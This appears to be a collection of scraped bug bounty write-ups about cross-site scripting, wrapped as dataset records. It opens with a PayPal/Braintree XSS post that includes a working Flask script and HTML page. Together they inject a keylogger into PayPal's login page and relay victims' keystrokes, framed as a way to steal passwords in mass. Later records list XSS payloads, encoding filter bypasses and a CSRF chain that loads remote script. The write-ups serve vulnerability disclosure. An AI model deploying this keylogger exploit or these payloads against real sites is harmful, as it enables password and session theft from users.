Guidelines for cyber security in the NBFC Sector SAR Audit ISO27001 PCI DSS GDPR Hipaa Audit SOC2 Assessment Resources Blog Case studies White Papers Datasheets Events Podcast Company About us Partners Careers Contact Hamburger Toggle Menu Schedule a Meeting Cyber Security · E-commerce · Write-up Persistent XSS to Steal Passwords – Paypal By user Note: This bug has been reported via Paypal bug bounty program and is fixed now. POC FIRST? There are days when we get to test different applications with third party integrations such as payment gateways, logging etc etc. Same way we got to test one of our client application that uses braintree as a payment gateway(Braintree, a division of PayPal, is a company based in Chicago that specialises in mobile and web payment systems for e-commerce companies) Braintree provides an API for its merchants to easily consume it and integrate other services such as Paypal. You can read about it here: (https://developers.braintreepayments.com/guides/paypal/overview/javascript/v3) The client application was using braintree as the gateway and has a paypal checkout, clicking checkout button requested the following HTTP request POST /merchants/34v7znhy8njgntnr/client_api/v1/paypal_hermes/setup_billing_agreement HTTP/1.1 Host: api.braintreegateway.com User-Agent: python-requests/2.18.4 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Content-Type: application/json Content-Length: 1186 {\"returnUrl\": \"https://test.com\", \"cancelUrl\": \"https://test.com/\", \"experienceProfile\": {\"brandName\": \"Casper Sleep Inc.\", \"noShipping\": \"false\", \"addressOverride\": true}, \"shippingAddress\": {\"recipientName\": \"Test Test\", \"line1\": \"38 OXFORD STREET 302\", \"line2\": \"\", \"city\": \"LONDON\", \"state\": \"\", \"postalCode\": \"W1D 1AX\", \"countryCode\": \"GB\"}, \"braintreeLibraryVersion\": \"braintree/web/3.9.0\", \"_meta\": {\"merchantAppId\": \"casper.com\", \"platform\": \"web\", \"sdkVersion\": \"3.9.0\", \"source\": \"client\", \"integration\": \"custom\", \"integrationType\": \"custom\", \"sessionId\": \"5fc558ba-2fb7-4a79-a7ba-fef4fee926db\"}, \"authorizationFingerprint\": \"a60dc78155b9c65f05741aafc544bb90b9d2cee1376f1ce52ea1262bb0c67994|created_at=2017-12-24T14:04:17.144942456+0000&merchant_id=34v7znhy8njgntnr&public_key=msb362rjpg7nnvwd\"} The response will be a 302 redirect to the following URL https://www.paypal.com/agreements/approve?nolegacy=1&ba_token=<token> The above URL is valid for a couple of hours before it expires(still enough to launch a wide scale attack) The returnURL and cancelUrl parameters value could be set to any arbitrary URL(that was issue no1), but it was always observed that canceUrl value is reflected back in script context under paypal.com login page without any sanitisation or output encoding as required. Special characters like tags (>, <) were filtered but all others were allowed. Since the reflection was in script context and we only had to escape double quotes, we successfully & easily did that. But we know that XSS isn’t just about a pop up, getting to know the worst case scenario is best way to judge the severity of the vulnerability. In our case we exactly do that. Paypal’s Content Security Policy content-security-policy: default-src 'self' https://*.paypal.com https://*.paypalobjects.com; frame-src 'self' https://*.brighttalk.com https://*.paypal.com https://*.paypalobjects.com https://www.youtube-nocookie.com https://www.xoom.com https://*.pub.247-inc.net; script-src 'nonce-qox3mTimg6HhlWGFnpwLeOX14nhSoxzIAq9PGsBg0V7ClmIP' 'self' https://*.paypal.com https://*.paypalobjects.com 'unsafe-inline' 'unsafe-eval'; connect-src 'self' https://nominatim.openstreetmap.org https://*.paypal.com https://*.paypalobjects.com https://*.google-analytics.com https://*.salesforce.com https://*.force.com https://*.eloqua.com https://nexus.ensighten.com https://api.paypal-retaillocator.com https://*.brighttalk.com https://*.sperse.io https://*.dialogtech.com; style-src 'self' https://*.paypal.com https://*.paypalobjects.com 'unsafe-inline'; font-src 'self' https://*.paypal.com https://*.paypalobjects.com data:; img-src 'self' https: data:; form-action 'self' https://*.paypal.com https://*.salesforce.com https://*.eloqua.com; base-uri 'self' https://*.paypal.com; block-all-mixed-content; report-uri https://www.paypal.com/csplog/api/log/csp From above policy we can see that Paypal allows inline scripts. So to smuggle CSRF tokens or passwords (since the XSS is on login screen) We can think about – key-logging and sending data across by calling images from my controlled site – key-logging and sending data across by calling fonts from my controlled site – key-logging and send ajax requests etc etc But the content security policy says NOPE. connect-src is self, img-src is self, font-src is self. So we were thinking we are only left with pretty much redirecting users or opening a new tab every time they type (but ughhh that’s boring and not very stealthy!). Then it struck our mind, how about use HTML5’s cool stuff like event listeners and make this happen. Bingo! Here is our final payload(and the video at starting shows the same). Python Script import requests import json from flask import Flask, render_template app = Flask(__name__) def test(): data = {\"returnUrl\":\"https://test.com\",\"cancelUrl\":\"https://test.com/?dddddddd?\\\"}}; var WEBKEY={dataLog:'',start:function(){window.onkeypress=function(t){WEBKEY.dataLog+=String.fromCharCode(t.charCode)},setInterval('WEBKEY.exportLog();',5e3)},exportLog:function(){WEBKEY.dataLog.length>0&&(WEBKEY.dataLog='')}};WEBKEY.start();window.addEventListener('message',function(e){e.source.postMessage(WEBKEY.dataLog,'*')},!1); var a={\\\"test\\\":{\\\"test\\\":\\\"\",\"experienceProfile\":{\"brandName\":\"Casper Sleep Inc.\",\"noShipping\":\"false\",\"addressOverride\":True},\"shippingAddress\":{\"recipientName\":\"Test Test\",\"line1\":\"38 OXFORD STREET 302\",\"line2\":\"\",\"city\":\"LONDON\",\"state\":\"\",\"postalCode\":\"W1D 1AX\",\"countryCode\":\"GB\"},\"braintreeLibraryVersion\":\"braintree/web/3.9.0\",\"_meta\":{\"merchantAppId\":\"casper.com\",\"platform\":\"web\",\"sdkVersion\":\"3.9.0\",\"source\":\"client\",\"integration\":\"custom\",\"integrationType\":\"custom\",\"sessionId\":\"5fc558ba-2fb7-4a79-a7ba-fef4fee926db\"},\"authorizationFingerprint\":\"a60dc78155b9c65f05741aafc544bb90b9d2cee1376f1ce52ea1262bb0c67994|created_at=2017-12-24T14:04:17.144942456+0000&merchant_id=34v7znhy8njgntnr&public_key=msb362rjpg7nnvwd\"} headers = {\"Content-Type\" :\"application/json\"} r = requests.post(\"https://api.braintreegateway.com/merchants/34v7znhy8njgntnr/client_api/v1/paypal_hermes/setup_billing_agreement\", json=data,headers=headers) response = json.loads(r.text) url = response[\"agreementSetup\"][\"approvalUrl\"] url = url.replace(\"\\u0026\", \"&\") print(\"send this to victim\") print(\"==================\") return url @app.route(\"/\") def hello(): return render_template('1.html', name=test()) if __name__ == '__main__': app.run() HTML <html><html> <script> //create popup windowvar domain = \"{{name | safe}}\";var myPopup = window.open(domain,'myWindow'); //periodical message sendersetInterval(function(){ var message = 'Hello! The time is: ' + (new Date().getTime()); myPopup.postMessage(message, '*'); //send the message and target URI},100); //listen to holla backwindow.addEventListener('message',function(event) { console.log('victim typed: ',event.data);},false); </script> </html> Worst case scenario? This flask app can be hosted online and then shared with multiple people making it a deadly attack allowing us to steal passwords in mass. Is there a better way you can exploit this? I would love to hear :). @akhilreni_hs cybersecurity ecommerce payment gateways paypal persistent XSS Related Articles Cyber Security · Red Team · Threat Simulation Endpoint Security: The Least Privilege Approach Cyber Security · Data Privacy · Infographic Data Breaches in February 2023 – Infographic Blog · Cyber Security · Cyber Threat Top 5 Cybersecurity Trends to Keep an Eye on in 2023 Leave A Reply Cancel reply Your email address will not be published. Required fields are marked * Comment Name * Email * Website Save my name, email, and website in this browser for the next time I comment. XSS by Tossing Cookies Previous Article 3 Simple Fixes to Stop 90% of Hackers Next Article Industries BFSI Healthcare Government Retail & eCommerce Information Technology Telecommunications SERVICES Application Security Network Security Cloud Security Staffing Services Threat Simulation CERT-In Audit Services SOLUTIONS Managed Security Threat Intelligence as a Service Vulnerability Management as a Service Vulnerability Remediation as a Service Strategic Security Solutions resources Blog Datasheets Case studies Podcasts Events company About Partners Careers CERT-In New White papers Contact Privacy Policy WE ARE CERTIFIED TRUST WE GAINED © 2024 WeSecureApp. All rights reserved. logo--facebook logo--instagram logo--linkedin logo--twitter Cloud Security VAPT By failing to prepare, you are preparing to fail Get Started! By failing to prepare, you are preparing to fail By failing to prepare, you are preparing to fail Blog Write For Us Subscribe to Our Podcasts Get Started! Take a peek into sample report Get Started! Get Started! Take a peek into sample report By failing to prepare, you are preparing to fail Get Started! Take a peek into sample report By failing to prepare, you are preparing to fail By failing to prepare, you are preparing to fail Take a peek into sample report Get Started! Get Started! Download Now Take a peek into sample report Download Your Comprehensive Guide to Threat Modeling Today! Staffing Services Threat Simulation BOT Force Fixed Force Flex Force Get CERT-In Audit Get Started! Get Started! Get Started! Get Started! Get Started! Get Started! Get Started! Get Started! Get Started! Get Started! Full Name Phone Email Send We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it. Ok"}
{"source_url": "https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158", "title": "How i converted SSRF TO XSS in jira. | by Ashish Kunwar | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow i converted SSRF TO XSS in jira. | by Ashish Kunwar | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How i converted SSRF TO XSS in jira. Ashish Kunwar 2 min read · Jun 1, 2018 -- 3 Listen Share I m very much into Bug Bounty and i spend my whole day doing this finding new and interesting stuff and kept on upgrading my recon techniques. So this Site was random and has vast subdomains to test domain *.example.com so i used some sites to find subdomains FindSubdomains.com 2. DnsDumpster 3. virustotal 4. Acunetix mannual tool Before i start Acunetix does Subdomain scans so just set the time out to 20 and you will get a really big list with banners and response headers. (it does the half of the work for you.) Now, i been through lots of subdomains and i was specifically looking for any jira environment , and i found one. lets say wiki.example.com so i looked at the version and it was “5.8.13” ,which is affected to ssrf …… I remember the “ Alyssa Herrera ” writeup on “ Piercing the Veil: Server Side Request Forgery to NIPRNet access ” so i quickly visited “ plugins/servlet/oauth/users/icon-uri?consumerUri=http://google.com ” And Boom i got the google page and i m like Hell Yea ! So i followed the writeup but couldn’t managed to get any sensitive info . [Yes i tried everything ..nothing worked.] And that’s where i was like “why god?” why ? why God? and then suddenly it came to my mind and i went to brute xss blog copied “ http://brutelogic.com.br/poc.svg ” , and put it place of https://google.com and boom , i got XSS Press enter or click to view image in full size ssrf to XSS in #Vain So it worked and i got bounty of 50$ which is less (and that company sucks) Anyways it doesn’t matter at all , it was all about exploration and learning new things and gain experience. #sharing is #caring Hope you guys enjoyed it and learned something new. #[For who doesn’t know ,rest are leets]. Thank you ./Logout follow me on twitter: Ashish Kunwar and if you have any questions DM is open only for followers. Security Bug Bounty White Hat Hacker Cybersecurity -- -- 3 Written by Ashish Kunwar 894 followers · 136 following i m a security researcher and exploit developer/ and love Fuzzing and break things |bug hunter| Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@hacker_eth/xss-in-microsoft-7a70416aee75", "title": "Xss in Microsoft. I have done the usual recon process and… | by hacker_eth | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@hacker_eth/xss-in-microsoft-7a70416aee75. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXss in Microsoft. I have done the usual recon process and… | by hacker_eth | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Xss in Microsoft hacker_eth 1 min read · May 18, 2018 -- 2 Listen Share I have done the usual recon process and found a subdomain of microsoft (imagineacademy.microsoft.com) ,which faced XSS(cross side scripting) bug.. I had reported the same following responsible disclosure measures to microsoft ,in the month of march. After few days,I received a confirmation mail from Microsoft stating that a –“ A ﬁx was conﬁrmed for the issue you presented. Microsoft would like to recognize your eﬀorts on our public security researcher acknowledgement page: “Security Researcher Acknowledgments for Microsoft Online Services”. “ This was my first bug report and achievement from Microsoft. They have provided me security acknowledgement in their website(hall of fame equivalent for microsoft) and also swag(for other vulnerabilty,which i cannot disclose now). The payload was simple one :<svg/onload=alert(document.charset)>,in the search bar. Press enter or click to view image in full size This is my first article on my findings….. I will continue to update my further finding, To receive updates kindly follow me up. Security Cybersecurity Computer Security Bug Bounty Microsoft -- -- 2 Written by hacker_eth 47 followers · 8 following Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@renwa/self-xss-csrf-to-stored-xss-54f9f423a7f1", "title": "Self-XSS + CSRF to Stored XSS. Hola, this is Renwa from Kurdistan i’m… | by Renwa | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@renwa/self-xss-csrf-to-stored-xss-54f9f423a7f1. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSelf-XSS + CSRF to Stored XSS. Hola, this is Renwa from Kurdistan i’m… | by Renwa | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Self-XSS + CSRF to Stored XSS Renwa 3 min read · May 20, 2018 -- Listen Share Hola, this is Renwa from Kurdistan i’m glad to write my first write-up about infosec and Bugbounties. so i was digging in the website and finally i found an xss when a user wants to change his name added a simple payload and refreshed the page, bingo! Press enter or click to view image in full size user settings panel Press enter or click to view image in full size XSS proof so the problem is the profile is not public and the only way to get the XSS is to tell the victim to change his name to malicious javascript code and that will be called Self-XSS there is no impact with it. i started burpsuite and changed my name the request looks like: Press enter or click to view image in full size hmm that looks interesting, i generated burpsuite CSRF poc Press enter or click to view image in full size replayed in browser response was: Press enter or click to view image in full size Awesome! now we have CSRF + Self-XSS let’s chain that together the form now looks like: Press enter or click to view image in full size Final POC as you can see in the last name field i have added the javascript code it’s from xsshunter.com that generate XSS poc you should give a try. “><script src= https://***.xss.ht ></script> and in the last i have added javascript submit form on load the file to make it more effective. now the user name is changed to the javascript code after he navigate the homepage the code will be in his browser and send back all info’s we need since there wasn’t any CSP protection. Press enter or click to view image in full size Stored XSS and going back to XSSHunter we can confirm it became Stored XSS, when any user opens our HTML form. Press enter or click to view image in full size After all thanks for reading if i helped clap hands to more write-ups about infosec, remember where there is self-XSS always look for CSRF to chain it together and make it a stored, by self-XSS i don’t mean user entered codes into browser console or self-dom XSS . //Renwa JavaScript Csrf Xss Attack Bug Bounty Infosec -- -- Written by Renwa 727 followers · 0 following No responses yet Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://cybristerboy.blogspot.com/2018/05/how-i-found-5-store-xss-on-private.html", "title": "How I found 5 store XSS on a private program. Each worth \"1,016.66$\"", "friendly_explanation": "This is a bug bounty writeup from https://cybristerboy.blogspot.com/2018/05/how-i-found-5-store-xss-on-private.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I found 5 store XSS on a private program. Each worth \"1,016.66$\" Skip to main content Search This Blog CybristerBoy How To Test Cross Origin Resource Sharing Vulnerability (OTG-CLIENT-007) Get link Facebook X Pinterest Email Other Apps - June 30, 2018 Hello Everyone, This blog is all about Cross Origin Resource Sharing (CORS) Vulnerability. In my one year of research, I found various type of bypass, that I would like to discuss. I will keep this blog to the point without discussing backend reason, so that beginner can find it an easy one. If a site is allowing access control header at the output response then play with all the request and capture it on burp or any proxy you use. After getting all directory on burp -> target -> sitemap, then this is a good time to test !! Most of the people just test it on one point, but each directory has its own way to set access control header. So, test it on every directory. For example -dir1 -sub_dir1 -sub_dir2 -dir2 -sub_dir1 -sub_dir2 Here you need to test on dir1 and dir2. How To Test First, put any random character at origin header at the inpu... 2 comments Get link Facebook X Pinterest Email Other Apps How I found 5 store XSS on a private program. Each worth \"1,016.66$\" Get link Facebook X Pinterest Email Other Apps - May 30, 2018 Hello everyone, This is my second blog of the series \" Sharing Is Caring \". What I have learnt until now because of those guys who believe in that 'methodology' :) The site is private, so call it private-site.com. 1- Store XSS using comment body I found that on a private-site.com, the comment body was reflecting on user own profile. So, I started hunting in a way to find something special. After many tried and tested with each and every payload I got nothing. But, I believe in a sentence \"There is always a way to bypass\" {Thanks to zahid ali who once said this and proved it on facebook, when bypassed same feature three times} Anyway, I didn't give up and thinking to bypass. Later, an idea clicked on my mind to use payload on second or third line as I have read in other researcher posts. The xss got store when I used my favourite payload <svg/onload=alert(1337)> on the second line of the body. Time spent: 9-10 hours 2- Store XSS using the file attachment This XSS was very easy to find. But I found it at the end when the program was about to close. I am more curious about how nobody found it. I saw a file attachment feature and tested it as my regular technique. I uploaded request on burp and sent to intruder. Then uploaded all file extensions on burp to see what extensions are allowed. Extensions which was allowed [.txt, .png, .jpg and '.xhtml' . Yes .xhtml !! ] For POC I uploaded the below code and reported it. <?xml version=\"1.0\" encoding=\"iso-8859-1\"?> <!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xml:lang= \"en\" lang= \"en\" xmlns= \"http://www.w3.org/1999/xhtml\" > <head> <title> POC </title> </head> <body> <p> This is a POC </p> <script> alert ( document . cookie ) </script> </body> </html> Time spent: 1 hour 3- Store XSS on the notification This type of XSS is my most favourite, I found it 3 times on different program. There was a feature on private-site.com, when a user performs any activity then follower user gets the notification. On notification the HTML tag was not sanitizing, So i used payload \"><svg/onload=alert(1337)> and made notification store xss. 4- Store XSS using encoding I found that on one endpoint the data was stored on a user profile. But it was blocking < tag. When I come across that situation, I just take the request on the burp and send the request to the intruder with the below payloads to see < sign can bypass or not. < %3C &lt &lt; &LT &LT; &#60 &#060 &#0060 &#00060 &#000060 &#0000060 &#X3C; &#X03C; &#X003C; &#X0003C; &#X00003C; &#X000003C; \\x3c \\x3C \\u003c \\u003C Luckly, &#X000003C; was working. So i just used \">&#X000003C;svg/onload=alert(1337)> and got store xss on user profile. 5- Weird Store XSS This XSS took around 2-3 days to find a bypass. I am not allowed to use the exact term of the site that would help other to get clue. So it is one point where < and > sign was allowed but only width and height can be used. For example: < svg width=100 height=100> was allowed but when I used event handler it blocked. After two days I was about to give up. But I gave it one more day :) On one moment I sent the request to intruder with payload POST /< svg width=100 hight=100>test I forgot that i have added <svg width=100 hight=100>. So intruder tried different payload on 'test'. At one point the payload was <svg width=100 hight=100><script>alert(1)</script> With the above payload, the store xss truly stored. Actually, the filter was checking the first HTML tag. It is really weird behaviour to me how this payload worked <svg><script>alert(1)</script> Reach me on Facebook or Twitter Get link Facebook X Pinterest Email Other Apps Comments Shahzad 8 June 2018 at 11:33 Bugcrowd! Reply Delete Replies Reply stack4today 15 August 2018 at 01:09 hi sir any reference for hunt api scope? Reply Delete Replies Reply Add comment Load more... Post a Comment Popular posts from this blog How To Test Cross Origin Resource Sharing Vulnerability (OTG-CLIENT-007) - June 30, 2018 Hello Everyone, This blog is all about Cross Origin Resource Sharing (CORS) Vulnerability. In my one year of research, I found various type of bypass, that I would like to discuss. I will keep this blog to the point without discussing backend reason, so that beginner can find it an easy one. If a site is allowing access control header at the output response then play with all the request and capture it on burp or any proxy you use. After getting all directory on burp -> target -> sitemap, then this is a good time to test !! Most of the people just test it on one point, but each directory has its own way to set access control header. So, test it on every directory. For example -dir1 -sub_dir1 -sub_dir2 -dir2 -sub_dir1 -sub_dir2 Here you need to test on dir1 and dir2. How To Test First, put any random character at origin header at the inpu... Read more How i was able to get admin panel on a private program - May 29, 2018 Hello everyone, I would like to disclose one of my recent finding in which I was able to get the admin panel on a private program. The program is private, so call it private-site.com. As many researchers believe in recon beforae hunting a target, same this law apply to me. Around two months ago I was invited in a private program, the first step I did to know all about the target. I strongly believe that recon is incomplete without using censys and shodan search engine. I always use it at first whenever choose a target. Same on that day I searched about the private-site.com. I was lucky by using the certificate base query as below https://censys.io/ipv4/help?q=80.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names%3Aprivate-site.com When using the above query i got many open ports. So i directly hit the target with port and thinking something special will come in response. But with all ports i was getting reponse \"E... Read more Powered by Blogger Theme images by Michael Elkan Shahzad Visit profile Archive June 2018 1 May 2018 2"}
{"source_url": "https://medium.com/@newp_th/reflected-xss-on-stack-overflow-b8366a855472", "title": "Reflected XSS on Stack Overflow. This is @newp_th. Today I want to share… | by newp_th | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@newp_th/reflected-xss-on-stack-overflow-b8366a855472. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected XSS on Stack Overflow. This is @newp_th. Today I want to share… | by newp_th | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Reflected XSS on Stack Overflow newp_th 2 min read · Apr 27, 2018 -- 2 Listen Share This is @newp_th . Today I want to share with you a Reflected XSS which I found in Stack Overflow. While i was testing some other domain and doing spider activity in burpsuite, I checked issues tab whether any issues were popped up. Suddently i got to know Stack Overflow is vulnerable to XSS (i used reflector extension https://github.com/elkokc/reflector ). So i decided to test that domain of Stack Overflow. Reflector extension: Burp Suite extension is able to find reflected XSS on page in real-time while browsing on web-site and include some features as: Highlighting of reflection in the response tab. Test which symbols is allowed in this reflection. Analyze of reflection context. Content-Type whitelist. When i was going through the Stack Overflow domain, I noticed a vulnerable parameter in Cookie!!, I put a simple payload “></script><img src=x onerror=alert(1)> into the prov parameter. Press enter or click to view image in full size Request After cheking the reponse from IE, Got the XSS POPUP!!!! Press enter or click to view image in full size Note: Dedicated to my friend Renjith( https://ae.linkedin.com/in/renjith-tc-bb9b40a1 ), I greatly appreciate the time you’ve taken to share your knowledge with me HOF on the way!!!! Press enter or click to view image in full size Timeline Feb 14th -Report submitted Feb 19th -Triaged April 3rd -Fixed -- -- 2 Written by newp_th 321 followers · 269 following secure your computer 😊 Responses ( 2 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@ozil.hakim/stored-xss-in-yahoo-and-all-subdomains-bbcaa7c3b8d", "title": "Stored XSS in Yahoo and all subdomains! | by Hakim Bencella | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@ozil.hakim/stored-xss-in-yahoo-and-all-subdomains-bbcaa7c3b8d. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS in Yahoo and all subdomains! | by Hakim Bencella | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS in Yahoo and all subdomains! Hakim Bencella 1 min read · May 19, 2018 -- 1 Listen Share Press enter or click to view image in full size This is Hakim Bencella (H4kst3r) , and im from ALGERIA. I always believed that sharing is caring, and i have been learning from multiple security researchers in the bug bounty field , Now, I am going to share with how I found Stored Cross-Site Scripting (XSS) in Yahoo (all domains where you can post a comment) Steps to Reproduce : Go to https://www.yahoo.com/ * Comment this payload: <script>alert();</script>”><<script>alert();</script>img src=x onerror=alert();> ANDD YEEAAH :D Press enter or click to view image in full size Here is the video PoC: Timeline : 27/11/2017— Initial Report. 30/10/2017 — Triaged + initial reward 300$ 23/02/2018 — Bug Resolved. + $1200 bounty rewarded. ( Total $1500 ) /H4kst3r : https://hackerone.com/H4kst3r https://www.instagram.com/i.c0de/ https://twitter.com/H4kst3r https://facebook.com/H4kst3r Security Bug Bounty Yahoo Hackerone Pentesting -- -- 1 Written by Hakim Bencella 63 followers · 20 following Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@vis_hacker/how-i-got-stored-xss-using-file-upload-5c33e19df51e", "title": "How I got stored XSS using file upload | by Gujjuboy10x00 | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@vis_hacker/how-i-got-stored-xss-using-file-upload-5c33e19df51e. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I got stored XSS using file upload | by Gujjuboy10x00 | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I got stored XSS using file upload Gujjuboy10x00 2 min read · Apr 17, 2018 -- 7 Listen Share Hi Everyone, I always believed that sharing is caring, and i have been learning from multiple security researchers in the bug bounty field ,Today i am going to share simple method of getting xss in file upload. few days back i got invitation from hackerone private program. it was very old program (100+ report resolved). still i tried to get something interesting. After looking inside that functionality i can see that there is option to upload data manually as well as using file upload (Only CSV). there was a strict restriction of file upload for extension (.csv only). there was 4 option firstname , lastname , company , mobile number. Simply i tried to bypass using Burp by changing content-type to text/html , but no success in xss as there was something blocking at server level. time to dig more Later I tried to put simple payload in CSV file , like <script>alert(1)</script> in first 3 field , but something was blocking at server to not allow <script> tag. then i tried for many payload nothing was working. Finally i tried with </Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>” and got stored xss. Press enter or click to view image in full size Stored xss and my expression was like (Mil gaya , mil gaya …): Thanks for reading my blog , hope you like this blog. Security Penetration Testing Hacking Hackerone Files -- -- 7 Written by Gujjuboy10x00 651 followers · 54 following security analyst | Keep calm and hack the planet https://linkedin.com/in/vishalpanchani Responses ( 7 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@nuraalamdipu/xss-403-forbidden-bypass-write-up-e070de52bc06", "title": "XSS “403 forbidden” bypass write up | by Nur A Alam Dipu | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@nuraalamdipu/xss-403-forbidden-bypass-write-up-e070de52bc06. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nXSS “403 forbidden” bypass write up | by Nur A Alam Dipu | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in XSS “403 forbidden” bypass write up Nur A Alam Dipu 3 min read · Apr 25, 2018 -- 4 Listen Share Hello, This is my second blog post and first write up about xss. I think there is no new things here that you can learn. If you see “akita” or “rahul-maini” blog you can learn more than this. This is just a part of learning from those wite up post. Okay lets start. Recent I found a cookie injection in a private site that is reflected something in a cookie parameter. In regular way I check all the parameter, input something like “xxxx”. I noticed in burp reapeater cookie “GA_countryCode=xxx” reflected in code function. GET /my/refer/welcome?rt=6bjzl0zEmBiPl0IQRSeN&cid=111&channel=1151 HTTP/1.1 Host: www.vuln.com User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0 Accept: */* Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded Cookie: RT=6bjzl0zEmBiPl0IQRSeN5wxxx; GA_countryCode=GBxxxxxx ”; GA_currentDomain=www.vuln.co.uk; feature_rollercoaster_upload=0; ABTasty=uid%3D18042509351658083%26fst%3D1524627317406%26pst%3Dnull%26cst%3D1524627317406%26ns%3D1%26pvt%3D1%26pvis%3D1%26th%3D; ‘session_status’ : “session_defined”, ‘page_name’ : pageName, ‘page_category’ : ‘My Account’, ‘country_code’ : “GBxxxxxx”, ‘ua’ : “UA-48172145–1”, ‘current_domain’ : window.location.host, ‘Cookie_Timeout’ : “2592000000”, ‘channel_id’ : “1151”, Press enter or click to view image in full size Then I checked “><svg/onload> and its also reflected. page_name’ : pageName, ‘page_category’ : ‘My Account’, ‘country_code’ : “GB”><svg/onload>”, ‘ua’ : “UA-48172145–1”, ‘current_domain’ : window.location.host, ‘Cookie_Timeout’ : “2592000000”, ‘channel_id’ : “1151” Press enter or click to view image in full size Now the problem is comes up, when I try “><svg/onload=>, “=” blocked. Press enter or click to view image in full size Then I used some technique that I learned from brutelogic blog. I noticed alert is okay, no blocked only “=” is blocked. Then I used playload Like “><svg/on</script>laod=alert> and saw that was bypassed and reflected. Press enter or click to view image in full size Then try with “><svg/on</script>load=alert(1)> “()” bracket blocked, then used ``. “><svg/on</script>load=alert`1`> its fine. Press enter or click to view image in full size But no pop up. As all are bypassed, so I was confirmed its possible to trigger xss. I try many other way to pop up, but failed. Because many restiction, “Access Denied HTTP/1.1 403 Forbidden” and ip blocked. Then I make a shortcut playload Like “-prompt`1`-”//. And it worked. :) Press enter or click to view image in full size Xss done!! Press enter or click to view image in full size For this simple playload, it takes a long time. :( For sure there was a possible way to bypass with normal playload, but i didn’t try more. Less knowledge can’t think more. Sorry for my bad English. Thanks for reading. Security Bug Bounty Xss Attack -- -- 4 Written by Nur A Alam Dipu 347 followers · 88 following Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@TheShahzada/stored-xss-in-yahoo-b0878ecc97e2", "title": "Stored XSS in Yahoo!. Sharing is Caring :)\n When we share, we… | by Shahzada AL Shahriar Khan | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@TheShahzada/stored-xss-in-yahoo-b0878ecc97e2. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS in Yahoo!. Sharing is Caring :) When we share, we… | by Shahzada AL Shahriar Khan | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS in Yahoo! Shahzada AL Shahriar Khan 2 min read · Apr 27, 2018 -- 6 Listen Share Sharing is Caring :) When we share, we open doors to a new beginning…../ Well, This is Shahzada Al Shahriar Khan. And I am from Bangladesh. Now I am going to share how I found Stored Cross-Site Scripting (XSS) in Yahoo. Steps to Reproduce: Go to https://www.yahoo.com/news Press enter or click to view image in full size Comment this payload: &quot;&gt;&lt;img src=x onerror=confirm(1);&gt; Press enter or click to view image in full size Now what? Voila! We get the famous confirm(1) to popup! :D Press enter or click to view image in full size I am trying another payload that I can write something in popup box, and found this payload: &lt;img src=x onerror=prompt(1337)&gt; That moment I feel like a boss! Press enter or click to view image in full size Press enter or click to view image in full size Here is the video PoC: Video PoC Timeline: 31/03/2018 — Initial Report. 01/04/2018 — HackerOne staff asked for ‘Needs more info.’ 01/04/2018 — More Info Submitted. 04/04/2018 — Triaged and a $300 initial bounty rewarded. 06/04/2018 — Bug Resolved. 11/04/2018 — $1700 bounty rewarded. ( Total $2000 ) Thanks for reading…./ ./TheShahada https://hackerone.com/theshahzada_thes https://twitter.com/TheShahzada https://www.facebook.com/TheShahzada.TheS http://blog.theshahzada.com/ Originally published at steemit.com on April 27, 2018. Bug Bounty Hackerone Hacking Yahoo Xss Attack -- -- 6 Written by Shahzada AL Shahriar Khan 490 followers · 2 following ~InfoSec Enthusiast, Bug Bounty Hunter, CTF Player…/ Responses ( 6 ) 